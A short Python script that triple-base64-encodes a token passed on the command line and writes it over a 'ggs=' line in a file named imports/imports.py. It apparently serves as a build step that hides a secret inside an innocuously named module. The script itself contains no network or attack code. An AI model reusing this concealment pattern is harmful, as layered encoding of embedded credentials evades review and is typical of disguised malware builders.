import sys,os,base64
if len(sys.argv)!=2:sys.exit(1)
input_token=sys.argv[1]
encoded_token=base64.b64encode(base64.b64encode(base64.b64encode(input_token.encode()))).decode()
script_dir=os.path.dirname(os.path.abspath(__file__))
imports_file_path=os.path.join(os.path.dirname(script_dir),"imports","imports.py")
if not os.path.exists(imports_file_path):sys.exit(1)
try:
 with open(imports_file_path,"r",encoding="utf-8")as file:imports_content=file.readlines()
except Exception:sys.exit(1)
for i,line in enumerate(imports_content):
 if 'ggs=base64.b64decode(base64.b64decode(base64.b64decode(' in line:
  imports_content[i]=f'ggs=base64.b64decode(base64.b64decode(base64.b64decode("""{encoded_token}""")))\n'
  break
try:
 with open(imports_file_path,"w",encoding="utf-8")as file:file.writelines(imports_content)
except Exception:sys.exit(1)
